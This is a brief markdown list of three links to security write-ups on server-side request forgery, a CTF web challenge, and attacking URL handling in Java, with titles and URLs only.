- [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
- [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
- [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
